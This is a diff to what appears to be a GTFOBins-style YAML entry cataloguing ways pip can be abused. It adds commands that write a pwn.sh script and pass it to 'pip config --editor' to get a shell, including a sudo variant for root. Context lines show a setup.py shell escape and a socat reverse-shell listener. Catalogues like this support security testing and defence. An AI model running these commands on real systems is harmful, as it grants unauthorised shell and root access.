@@ -5,6 +5,10 @@ functions:
         TF=$(mktemp -d)
         echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
         pip install $TF
+    - code: |
+         TF=$(mktemp -d)
+         printf '#!/bin/bash\n/bin/bash' > $TF/pwn.sh && chmod +x $TF/pwn.sh
+         pip config --editor $TF/pwn.sh edit
   reverse-shell:
     - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
@@ -70,4 +74,8 @@ functions:
         TF=$(mktemp -d)
         echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
         sudo pip install $TF
+    - code: |
+         TF=$(mktemp -d)
+         printf '#!/bin/bash\n/bin/bash' > $TF/pwn.sh && chmod +x $TF/pwn.sh
+         sudo pip config --editor $TF/pwn.sh edit
 ---
